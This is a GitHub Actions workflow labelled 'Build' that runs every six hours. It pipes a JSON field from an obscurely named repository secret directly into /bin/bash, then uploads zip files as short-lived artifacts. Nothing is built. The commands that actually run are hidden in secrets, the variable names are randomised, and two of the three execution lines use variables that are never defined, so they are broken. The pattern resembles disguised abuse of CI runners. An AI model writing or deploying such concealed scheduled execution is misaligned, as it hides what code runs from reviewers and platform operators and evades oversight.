name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '4 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  handler:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          xddzn63118: ${{ secrets.xddzn63118 }}
        run: |
          printf '%s' "$xddzn63118" | jq -r .uvq28 | /bin/bash
          echo $jt95350 | jq -r .lwie54957 | /bin/bash
          printf '%s' "$tuqje4551" | jq -r .zlsfi1 | /bin/bash

      - name: Persist output
        uses: actions/upload-artifact@v4
        with:
          name: JEwQDLIq
          path: "*.zip"
          retention-days: 1
